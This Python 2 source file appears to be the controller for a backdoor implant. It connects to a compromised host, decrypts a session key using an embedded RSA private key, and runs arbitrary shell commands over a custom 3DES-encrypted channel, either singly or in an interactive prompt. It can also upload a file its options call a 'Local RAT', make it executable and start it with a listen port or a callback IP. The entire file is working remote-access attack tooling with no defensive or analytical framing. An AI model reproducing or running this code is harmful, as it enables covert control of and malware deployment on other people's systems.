#!/usr/bin/env python

import os,sys,socket,random,re
from binascii import hexlify, unhexlify
from struct import pack,unpack
from optparse import OptionParser
from math import log

version = '1.1.0.0'

# RSA key modulus
rsa_n = 'c79924f312ab95086e5957d0310465a8a8c365ddfb62efda12317f5fea2e5d03a94d2c3415682fdad63c957195b205860ccfcc38a5efa273cb2f6b8146d0a66e0ae83f06e3e0fde5bdb4aba9d79f4504ad5e46f5d3736429002b84a513157a27ba2e26dfb7dac016b10cee029b94ef8d051f8e0fc21125217cac393be56f4fac155c1d0d59f5b0c2b0e9ab4af5a246a8485159b6547d4fdf2f4de0bbb44e4b126aeeca5313d2df679b83c160ec7d0d2712b9c1ae75348ffb0097076133ebb338557abb1efcd6c27c1984c667790877696ce19049c0d5173f348ed4e891ff7bbfbc74cc73cfe9ad2c3da4e04f7d0071634c942efd71b24dfb2444b77464594a31'

# RSA private exponent
rsa_d = '3a20c18000b9f387270be1e501c17411b0446790443bc5fa4e3e180848dd03bda33a945afeb8fee6ce698a642fe24e758199aab1fcb1533041c6279ad892bf4560ebce1f25924a9ef3a6802fd059d3f1cec39c0acf6fd5859345193631de995aa47ff85642e6f3f627cdca2afc405d9b4618b078aa5defe056bc99567634fa90707daf9051c93372d65bdd38da19bcce80dcf545a16688ce52c8e66a0e3de32234b94d5f332b5fc8883ae90afc0f8566ffd3d53205468f007ab8ac5e7625b46de024422a1fae32d905c33b9fdb02c7f7323a16f9a35b91749957a776bbc0f3e72ca642d04633e2a2d8eb38f0450bcf64f8005b6c0e5ee3cee261aa4cfcbb2b79'

# RSA public exponent
rsa_e = '10001'

class magicclient:

    def __init__(self):

        self.version = version

        #These are used for decrypting data from server
        self.sz_chk = "x8jV"
        self.rsa = RSA(rsa_n, rsa_e, rsa_d)
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.AUTO    = False
        self.options = None

        self.errorCodes = {
                    "0": "Command Ran Successfully",
                    "1": "Error running command",
                    "2": "Directory already exists"
                  }


    def recvall(self, size):

        data = ""

        while len(data) != size:
            try:
                buf = self.s.recv(size - len(data))
            except:
                print "Socket timeout error"
                return None

            if len(buf) == 0:
                return None

            data += buf

        return data


    def generate_iv(self):

        iv = ''.join([chr(random.randint(0, 255)) for x in xrange(0, 8)])

        return iv


    def send_file(self):

        full_path = "%s/%s" % (self.options.DIR, self.options.REMOTE)

        print "Getting Directory List of %s" % self.options.DIR
        result = self.send_command("ls -al %s" % self.options.DIR)

        if re.search('not found', result, re.I) != None and \
                re.search('not such file', result, re.I) != None:
            print "** Directory Exists **"
        else:
            print "Sending: mkdir %s" % self.options.DIR

            result = self.send_command("mkdir %s" % self.options.DIR)
            print result

            if result == None or result.find("No such file or directory") != -1:
                return False
    
        print "Reading in local file"

        fp = open(self.options.LOCAL, 'rb')
        localData = fp.read()
        fp.close()
        
        print "Sending file"

        command = "\x02%s\x00%s" % (full_path, localData)
        self.send_data(command)

        # get response
        size = self.recv_size()
        if size == -1:
            return False

        data = self.recv_data(size)

        if data == "ok":
            print "Upload succeeded"

            if self.options.BEFORE:
                cmd = "%s " % self.options.BEFORE
            else:
                cmd = "PATH=. && "
                if self.options.LISTEN_PORT:
                    cmd += "D=-l%s " % self.options.LISTEN_PORT
                elif self.options.CALLBACK_IP:
                    cmd += "D=-c%s:%s " % (self.options.CALLBACK_IP, 
                                           self.options.CALLBACK_PORT)

            cmd += "%s" % self.options.REMOTE

            if self.options.AFTER:
                cmd += " %s" % self.options.AFTER

            fullCmd = "cd %s && chmod 700 %s && %s" % (self.options.DIR, 
                                                       self.options.REMOTE, cmd)
            result = self.send_command(fullCmd)
            print result

            return True
        else:
            print "Binary upload failed"
            return False


    def send_data(self, data):

        iv1 = self.generate_iv()
        iv2 = self.generate_iv()

        enc_data = self.des.encrypt(data, iv2, 1)
        enc_len = self.des.encrypt(pack("!I", len(enc_data)) + self.sz_chk, iv1, 0)

        to_send = "%s%s%s%s" % (iv1, enc_len, iv2, enc_data)
        #print "sending: %s" % hexlify(to_send)

        try:
            self.s.sendall(to_send)
        except:
            print "Error sending to socket"


    def recv_size(self):

        data = self.recvall(16)
        if data is None:
            return -1

        iv = data[:8]
        size_enc = data[8:]
        size_buf = self.des.decrypt(size_enc, iv, 0)
        size = unpack("!I", size_buf[:4])[0]

        if size_buf[4:] != self.sz_chk:
            return -1

        return size


    def recv_data(self, size):

        data = self.recvall(8 + size)
        if data is None:
            return None

        iv = data[:8]
        buf_enc = data[8:]
        buf = self.des.decrypt(buf_enc, iv, 1)

        return buf


    def send_command(self, cmd):

        print "Executing: %s" % cmd

        self.send_data("\x01%s" % cmd)

        size = self.recv_size()
        if size == -1:
            return None

        result = self.recv_data(size)

        return result


    def connect(self):

        print "Connecting to %s:%s" % (self.options.ADDR, self.options.PORT)

        try:
            self.s.connect((self.options.ADDR, int(self.options.PORT)))
        except:
            print "Unable to connect to server"
            self.s.close()
            return False

        #Get Server SessionID/PAD
        try:
            enc_data = self.recvall(256)
            if enc_data == None:
                print "Unable to receive key"
                self.s.close()
                return False

            data = self.rsa.decrypt(enc_data)
        except:
            print "Unable to decrypt key"
            self.s.close()
            return False

        key = data[:24]
        self.des = DES(key)

        print "Got Session Key: %s" % hexlify(key)

        return True


    def main(self):

        if not self.parseArgs():
            return False

        if not self.connect():
            return False

        if not self.s:
            print "Error..."
            self.s.close()
            return False

        if self.AUTO:
            self.send_file()
        elif self.options.CMD:
            result = self.send_command(self.options.CMD)

            if result is None:
                print "Error from server"
                self.s.close()
                return False

            print result
            self.s.close()
        else:
            while self.s:
                print "_" * 15

                cmd = raw_input("Enter command: ")

                print "_" * 15

                if cmd == "exit" or cmd == "quit":
                    self.s.close()
                    return True

                result = self.send_command(cmd)
                if result is None:
                    print "Error from server. Exiting."
                    self.s.close()
                    return False

                print result


    def parseArgs(self):

        parser = OptionParser()

        parser.add_option("-i", dest="ADDR", type="string", action="store",
                          help="Server IP Address")
        parser.add_option("-p", dest="PORT", type="string", action="store",
                          help="Server Port")

        parser.add_option("-C", dest="CMD", type="string", action="store",
                          help="Run a command")
        parser.add_option("-d", dest="DIR", type="string", action="store",
                          help="Upload Directory")
        parser.add_option("-a", dest="LOCAL", type="string", action="store",
                          help="Local RAT")
        parser.add_option("-r", dest="REMOTE", type="string", action="store",
                          help="Remote RAT Name")

        parser.add_option("-l", dest="LISTEN_PORT", type="string", action="store",
                          help="Listen Port")
        parser.add_option("-c", dest="CALLBACK_IP", type="string", action="store",
                          help="Callback IP Address")
        parser.add_option("-o", dest="CALLBACK_PORT", type="string", action="store",
                          help="Callback Port")

        parser.add_option("-B", dest="BEFORE", type="string", action="store",
                          help="Prepend before binary")
        parser.add_option("-A", dest="AFTER", type="string", action="store",
                          help="Append after binary")

        (options, args) = parser.parse_args(sys.argv)

        if not options.ADDR or not options.PORT:
            print "Must Supply ADDR PORT and KEY"
            return False

        if options.CMD and (options.DIR or options.LOCAL or options.REMOTE):
            print "Can not do auto-upload with CMD"
            return False

        if options.DIR and options.LOCAL and options.REMOTE:
            self.AUTO = True

            if not os.path.exists(options.LOCAL):
                print "Local file must exist..."
                return False

            if options.LISTEN_PORT and (options.CALLBACK_IP or options.CALLBACK_PORT):
                print "Can not supply listen and callback..."
                return False

            if (options.CALLBACK_IP and not options.CALLBACK_PORT) or \
                    (options.CALLBACK_PORT and not options.CALLBACK_IP):
                print "Must supply both CALLBACK IP and PORT"
                return False

        self.options = options
        return True


class RSA:

    def __init__(self, modulus, pub_exponent=None, priv_exponent=None):

        self.n = long(modulus, 16)

        if pub_exponent != None:
            self.e = long(pub_exponent, 16)
        else:
            self.e = None

        if priv_exponent != None:
            self.d = long(priv_exponent, 16)
        else:
            self.d = None


    def encrypt(self, data):

        if self.e == None:
            raise Exception('No encryption exponent specified')

        num = self.bytes2long(data)

        if num > self.n:
            raise Exception('Data is too large')

        enc = pow(num, self.e, self.n)

        return self.long2bytes(enc)


    def decrypt(self, data):

        if self.d == None:
            raise Exception('No decryption exponent specified')

        num = self.bytes2long(data)

        if num > self.n:
            raise Exception('Data is too large')

        dec = pow(num, self.d, self.n)

        return self.long2bytes(dec)


    @staticmethod
    def bytes2long(bytes):

        return long(hexlify(bytes), 16)


    @staticmethod
    def long2bytes(num):

        hex_str = '%x' % num
    
        if len(hex_str) % 2 != 0:
            hex_str = '0%s' % hex_str

        return unhexlify(hex_str)


class DES:

    def __init__(self, key):

        if len(key) != 24:
            raise Exception('Key length must be 24 bytes')

        self.key_set = self.create_keys(key)


    def encrypt(self, message, iv, pad):

        return self.crypt_cbc(message, 1, iv, pad)


    def decrypt(self, message, iv, pad):

        return self.crypt_cbc(message, 0, iv, pad)


    def crypt_cbc(self, message, encrypt, iv, pad):

        spfunction1 = [0x1010400,0,0x10000,0x1010404,0x1010004,0x10404,0x4,0x10000,0x400,0x1010400,0x1010404,0x400,0x1000404,0x1010004,0x1000000,0x4,0x404,0x1000400,0x1000400,0x10400,0x10400,0x1010000,0x1010000,0x1000404,0x10004,0x1000004,0x1000004,0x10004,0,0x404,0x10404,0x1000000,0x10000,0x1010404,0x4,0x1010000,0x1010400,0x1000000,0x1000000,0x400,0x1010004,0x10000,0x10400,0x1000004,0x400,0x4,0x1000404,0x10404,0x1010404,0x10004,0x1010000,0x1000404,0x1000004,0x404,0x10404,0x1010400,0x404,0x1000400,0x1000400,0,0x10004,0x10400,0,0x1010004]    
        spfunction2 = [0x80108020,0x80008000,0x8000,0x108020,0x100000,0x20,0x80100020,0x80008020,0x80000020,0x80108020,0x80108000,0x80000000,0x80008000,0x100000,0x20,0x80100020,0x108000,0x100020,0x80008020,0,0x80000000,0x8000,0x108020,0x80100000,0x100020,0x80000020,0,0x108000,0x8020,0x80108000,0x80100000,0x8020,0,0x108020,0x80100020,0x100000,0x80008020,0x80100000,0x80108000,0x8000,0x80100000,0x80008000,0x20,0x80108020,0x108020,0x20,0x8000,0x80000000,0x8020,0x80108000,0x100000,0x80000020,0x100020,0x80008020,0x80000020,0x100020,0x108000,0,0x80008000,0x8020,0x80000000,0x80100020,0x80108020,0x108000]
        spfunction3 = [0x208,0x8020200,0,0x8020008,0x8000200,0,0x20208,0x8000200,0x20008,0x8000008,0x8000008,0x20000,0x8020208,0x20008,0x8020000,0x208,0x8000000,0x8,0x8020200,0x200,0x20200,0x8020000,0x8020008,0x20208,0x8000208,0x20200,0x20000,0x8000208,0x8,0x8020208,0x200,0x8000000,0x8020200,0x8000000,0x20008,0x208,0x20000,0x8020200,0x8000200,0,0x200,0x20008,0x8020208,0x8000200,0x8000008,0x200,0,0x8020008,0x8000208,0x20000,0x8000000,0x8020208,0x8,0x20208,0x20200,0x8000008,0x8020000,0x8000208,0x208,0x8020000,0x20208,0x8,0x8020008,0x20200]
        spfunction4 = [0x802001,0x2081,0x2081,0x80,0x802080,0x800081,0x800001,0x2001,0,0x802000,0x802000,0x802081,0x81,0,0x800080,0x800001,0x1,0x2000,0x800000,0x802001,0x80,0x800000,0x2001,0x2080,0x800081,0x1,0x2080,0x800080,0x2000,0x802080,0x802081,0x81,0x800080,0x800001,0x802000,0x802081,0x81,0,0,0x802000,0x2080,0x800080,0x800081,0x1,0x802001,0x2081,0x2081,0x80,0x802081,0x81,0x1,0x2000,0x800001,0x2001,0x802080,0x800081,0x2001,0x2080,0x800000,0x802001,0x80,0x800000,0x2000,0x802080]
        spfunction5 = [0x100,0x2080100,0x2080000,0x42000100,0x80000,0x100,0x40000000,0x2080000,0x40080100,0x80000,0x2000100,0x40080100,0x42000100,0x42080000,0x80100,0x40000000,0x2000000,0x40080000,0x40080000,0,0x40000100,0x42080100,0x42080100,0x2000100,0x42080000,0x40000100,0,0x42000000,0x2080100,0x2000000,0x42000000,0x80100,0x80000,0x42000100,0x100,0x2000000,0x40000000,0x2080000,0x42000100,0x40080100,0x2000100,0x40000000,0x42080000,0x2080100,0x40080100,0x100,0x2000000,0x42080000,0x42080100,0x80100,0x42000000,0x42080100,0x2080000,0,0x40080000,0x42000000,0x80100,0x2000100,0x40000100,0x80000,0,0x40080000,0x2080100,0x40000100]
        spfunction6 = [0x20000010,0x20400000,0x4000,0x20404010,0x20400000,0x10,0x20404010,0x400000,0x20004000,0x404010,0x400000,0x20000010,0x400010,0x20004000,0x20000000,0x4010,0,0x400010,0x20004010,0x4000,0x404000,0x20004010,0x10,0x20400010,0x20400010,0,0x404010,0x20404000,0x4010,0x404000,0x20404000,0x20000000,0x20004000,0x10,0x20400010,0x404000,0x20404010,0x400000,0x4010,0x20000010,0x400000,0x20004000,0x20000000,0x4010,0x20000010,0x20404010,0x404000,0x20400000,0x404010,0x20404000,0,0x20400010,0x10,0x4000,0x20400000,0x404010,0x4000,0x400010,0x20004010,0,0x20404000,0x20000000,0x400010,0x20004010]
        spfunction7 = [0x200000,0x4200002,0x4000802,0,0x800,0x4000802,0x200802,0x4200800,0x4200802,0x200000,0,0x4000002,0x2,0x4000000,0x4200002,0x802,0x4000800,0x200802,0x200002,0x4000800,0x4000002,0x4200000,0x4200800,0x200002,0x4200000,0x800,0x802,0x4200802,0x200800,0x2,0x4000000,0x200800,0x4000000,0x200800,0x200000,0x4000802,0x4000802,0x4200002,0x4200002,0x2,0x200002,0x4000000,0x4000800,0x200000,0x4200800,0x802,0x200802,0x4200800,0x802,0x4000002,0x4200802,0x4200000,0x200800,0,0x2,0x4200802,0,0x200802,0x4200000,0x800,0x4000002,0x4000800,0x800,0x200002]
        spfunction8 = [0x10001040,0x1000,0x40000,0x10041040,0x10000000,0x10001040,0x40,0x10000000,0x40040,0x10040000,0x10041040,0x41000,0x10041000,0x41040,0x1000,0x40,0x10040000,0x10000040,0x10001000,0x1040,0x41000,0x40040,0x10040040,0x10041000,0x1040,0,0,0x10040040,0x10000040,0x10001000,0x41040,0x40000,0x41040,0x40000,0x10041000,0x1000,0x40,0x10040040,0x1000,0x41040,0x10001000,0x40,0x10000040,0x10040000,0x10040040,0x10000000,0x40000,0x10001040,0,0x10041040,0x40040,0x10000040,0x10040000,0x10001000,0x10001040,0,0x10041040,0x41000,0x41000,0x1040,0x1040,0x40040,0x10000000,0x10041000]

        chunk = 0
        m=0
        i=0
        j=0
        temp=0
        temp2=0
        right1=0
        right2=0
        left=0
        right=0
        
        keys = self.key_set
        iterations = 9
        n = len(keys)

        if encrypt:
            looping = (0, 32, 2, 62, 30, -2, 64, 96, 2)
        else:
            looping = (94, 62, -2, 32, 64, 2, 30, -2, -2)

        if encrypt and pad:
            pad_len = 8 - (len(message) % 8)
            message = '%s%s' % (message, chr(pad_len) * pad_len)

        length = len(message)

        result = ""
        tempresult = ""

        cbcleft =  ((unpack("B", iv[m])[0] << 24) |
                    (unpack("B", iv[m+1])[0] << 16) |
                    (unpack("B", iv[m+2])[0] << 8) |
                    unpack("B", iv[m+3])[0]) & 0xffffffff
        cbcright = ((unpack("B", iv[m+4])[0] << 24) |
                    (unpack("B", iv[m+5])[0] << 16) |
                    (unpack("B", iv[m+6])[0] << 8) |
                    unpack("B", iv[m+7])[0]) & 0xffffffff

        m = 0
        while m < length:
            left =  ((unpack("B", message[m])[0] << 24) |
                     (unpack("B", message[m+1])[0] << 16) |
                     (unpack("B", message[m+2])[0] << 8) |
                     unpack("B", message[m+3])[0]) & 0xffffffff
            right = ((unpack("B", message[m+4])[0] << 24) |
                     (unpack("B", message[m+5])[0] << 16) |
                     (unpack("B", message[m+6])[0] << 8) |
                     unpack("B", message[m+7])[0]) & 0xffffffff

            m += 8

            if encrypt:
                left ^= cbcleft
                right ^= cbcright
            else:
                cbcleft2 = cbcleft
                cbcright2 = cbcright
                cbcleft = left
                cbcright = right

            temp = ((left >> 4) ^ right) & 0x0f0f0f0f
            right ^= temp
            left ^= (temp << 4) & 0xffffffff

            temp = ((left >> 16) ^ right) & 0x0000ffff
            right ^= temp
            left ^= (temp << 16) & 0xffffffff

            temp = ((right >> 2) ^ left) & 0x33333333
            left ^= temp
            right ^= (temp << 2) & 0xffffffff
        
            temp = ((right >> 8) ^ left) & 0x00ff00ff
            left ^= temp
            right ^= (temp << 8) & 0xffffffff

            temp = ((left >> 1) ^ right) & 0x55555555
            right ^= temp
            left ^= (temp << 1) & 0xffffffff

            left = ((left << 1) | (left >> 31)) & 0xffffffff
            right = ((right << 1) | (right >> 31)) & 0xffffffff

            for j in range(0,iterations,3):
                endloop = looping[j + 1]
                loopinc = looping[j + 2]

                i = looping[j]
                while i != endloop:
                    right1 = right ^ keys[i]
                    right2 = (((right >> 4) | (right << 28)) ^ keys[i+1]) & 0xffffffff
                
                    temp = left
                    left = right
                    right = temp ^ (spfunction2[(right1 >> 24) & 0x3f] |
                                    spfunction4[(right1 >> 16) & 0x3f] |
                                    spfunction6[(right1 >>  8) & 0x3f] |
                                    spfunction8[right1 & 0x3f] |
                                    spfunction1[(right2 >> 24) & 0x3f] |
                                    spfunction3[(right2 >> 16) & 0x3f] |
                                    spfunction5[(right2 >>  8) & 0x3f] |
                                    spfunction7[right2 & 0x3f])
                    
                    i += loopinc

                temp = left
                left = right
                right = temp

            left = ((left >> 1) | (left << 31)) & 0xffffffff
            right = ((right >> 1) | (right << 31)) & 0xffffffff

            temp = ((left >> 1) ^ right) & 0x55555555
            right ^= temp
            left ^= (temp << 1) & 0xffffffff
            temp = ((right >> 8) ^ left) & 0x00ff00ff
            left ^= temp
            right ^= (temp << 8) & 0xffffffff
            temp = ((right >> 2) ^ left) & 0x33333333
            left ^= temp
            right ^= (temp << 2) & 0xffffffff
            temp = ((left >> 16) ^ right) & 0x0000ffff
            right ^= temp
            left ^= (temp << 16) & 0xffffffff
            temp = ((left >> 4) ^ right) & 0x0f0f0f0f
            right ^= temp
            left ^= (temp << 4) & 0xffffffff
            
            if encrypt:
                cbcleft = left
                cbcright = right
            else:
                left ^= cbcleft2
                right ^= cbcright2

            tempresult += pack("BBBBBBBB", (left >> 24), ((left >> 16) & 0xff), 
                               ((left >> 8) & 0xff), (left & 0xff), (right >> 24), 
                               ((right >> 16) & 0xff), ((right >> 8) & 0xff), 
                               (right & 0xff))

            chunk += 8
            if chunk == 512:
                result += tempresult
                tempresult = ""
                chunk = 0

        result = '%s%s' % (result, tempresult)

        if not encrypt and pad:
            pad_len = ord(result[-1])
            end_idx = len(result) - pad_len
            result = result[:end_idx]

        return result


    def create_keys(self, key):

        pc2bytes0 = (0,0x4,0x20000000,0x20000004,0x10000,0x10004,0x20010000,0x20010004,0x200,0x204,0x20000200,0x20000204,0x10200,0x10204,0x20010200,0x20010204)
        pc2bytes1 = (0,0x1,0x100000,0x100001,0x4000000,0x4000001,0x4100000,0x4100001,0x100,0x101,0x100100,0x100101,0x4000100,0x4000101,0x4100100,0x4100101)
        pc2bytes2 = (0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808,0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808)
        pc2bytes3 = (0,0x200000,0x8000000,0x8200000,0x2000,0x202000,0x8002000,0x8202000,0x20000,0x220000,0x8020000,0x8220000,0x22000,0x222000,0x8022000,0x8222000)
        pc2bytes4 = (0,0x40000,0x10,0x40010,0,0x40000,0x10,0x40010,0x1000,0x41000,0x1010,0x41010,0x1000,0x41000,0x1010,0x41010)
        pc2bytes5 = (0,0x400,0x20,0x420,0,0x400,0x20,0x420,0x2000000,0x2000400,0x2000020,0x2000420,0x2000000,0x2000400,0x2000020,0x2000420)
        pc2bytes6 = (0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002,0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002)
        pc2bytes7 = (0,0x10000,0x800,0x10800,0x20000000,0x20010000,0x20000800,0x20010800,0x20000,0x30000,0x20800,0x30800,0x20020000,0x20030000,0x20020800,0x20030800)
        pc2bytes8 = (0,0x40000,0,0x40000,0x2,0x40002,0x2,0x40002,0x2000000,0x2040000,0x2000000,0x2040000,0x2000002,0x2040002,0x2000002,0x2040002)
        pc2bytes9 = (0,0x10000000,0x8,0x10000008,0,0x10000000,0x8,0x10000008,0x400,0x10000400,0x408,0x10000408,0x400,0x10000400,0x408,0x10000408)
        pc2bytes10 = (0,0x20,0,0x20,0x100000,0x100020,0x100000,0x100020,0x2000,0x2020,0x2000,0x2020,0x102000,0x102020,0x102000,0x102020)
        pc2bytes11 = (0,0x1000000,0x200,0x1000200,0x200000,0x1200000,0x200200,0x1200200,0x4000000,0x5000000,0x4000200,0x5000200,0x4200000,0x5200000,0x4200200,0x5200200)
        pc2bytes12 = (0,0x1000,0x8000000,0x8001000,0x80000,0x81000,0x8080000,0x8081000,0x10,0x1010,0x8000010,0x8001010,0x80010,0x81010,0x8080010,0x8081010)
        pc2bytes13 = (0,0x4,0x100,0x104,0,0x4,0x100,0x104,0x1,0x5,0x101,0x105,0x1,0x5,0x101,0x105)

        iterations = 3
        keys = [0] * (32 * iterations)
        shifts = (0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0)

        m=0
        n=0

        for j in range(0,iterations):
            left = ((unpack("B", key[m])[0] << 24) |
                    (unpack("B", key[m+1])[0] << 16) |
                    (unpack("B", key[m+2])[0] << 8) |
                    unpack("B", key[m+3])[0]) & 0xffffffff
            right = ((unpack("B", key[m+4])[0] << 24) |
                     (unpack("B", key[m+5])[0] << 16) |
                     (unpack("B", key[m+6])[0] << 8) |
                     unpack("B", key[m+7])[0]) & 0xffffffff

            m += 8

            temp = ((left >> 4) ^  right) & 0x0f0f0f0f
            right ^= temp
            left  ^= (temp << 4) & 0xffffffff

            temp = ((right >>  16)^ left) & 0x0000ffff
            left ^=  temp
            right ^= (temp <<  16) & 0xffffffff

            temp = ((left >> 2) ^  right) & 0x33333333
            right ^= temp
            left  ^= (temp << 2) & 0xffffffff

            temp = ((right >>  16)^ left) & 0x0000ffff
            left ^=  temp
            right ^= (temp <<  16) & 0xffffffff

            temp = ((left >> 1) ^  right) & 0x55555555
            right ^= temp
            left  ^= (temp << 1) & 0xffffffff

            temp = ((right >> 8) ^  left) & 0x00ff00ff
            left ^=  temp
            right ^= (temp << 8) & 0xffffffff

            temp = ((left >> 1) ^  right) & 0x55555555
            right ^= temp
            left  ^= (temp << 1) & 0xffffffff

            temp = ((left << 8) | ((right >> 20) & 0x000000f0)) & 0xffffffff
            left = ((right << 24) | ((right << 8) & 0xff0000) | 
                    ((right >> 8) & 0xff00) | ((right >> 24) & 0xf0)) & 0xffffffff
            right = temp
            
            for i in range(0,len(shifts)):
                if shifts[i]:
                    left = ((left << 2) | (left >> 26)) & 0xffffffff
                    right = ((right << 2) | (right >> 26)) & 0xffffffff
                    left <<= 0
                    right <<= 0
                else:
                    left = ((left << 1) | (left >> 27)) & 0xffffffff
                    right = ((right << 1) | (right >> 27)) & 0xffffffff
                    left <<= 0
                    right <<= 0

                left &= 0xfffffff0
                right &= 0xfffffff0
        
                lefttemp = (pc2bytes0[left >> 28] | 
                            pc2bytes1[(left >> 24) & 0xf] | 
                            pc2bytes2[(left >> 20) & 0xf] | 
                            pc2bytes3[(left >> 16) & 0xf] | 
                            pc2bytes4[(left >> 12) & 0xf] | 
                            pc2bytes5[(left >> 8) & 0xf] | 
                            pc2bytes6[(left >> 4) & 0xf])

                righttemp = (pc2bytes7[right >> 28] | 
                             pc2bytes8[(right >> 24) & 0xf] | 
                             pc2bytes9[(right >> 20) & 0xf] | 
                             pc2bytes10[(right >> 16) & 0xf] | 
                             pc2bytes11[(right >> 12) & 0xf] | 
                             pc2bytes12[(right >> 8) & 0xf] |
                             pc2bytes13[(right >> 4) & 0xf])

                temp = ((righttemp >> 16) ^ lefttemp) & 0x0000ffff
                keys[n] = (lefttemp ^ temp) & 0xffffffff
                keys[n+1] = (righttemp ^ (temp << 16)) & 0xffffffff

                n += 2

        return keys


if __name__ == "__main__":

    magicclient().main()
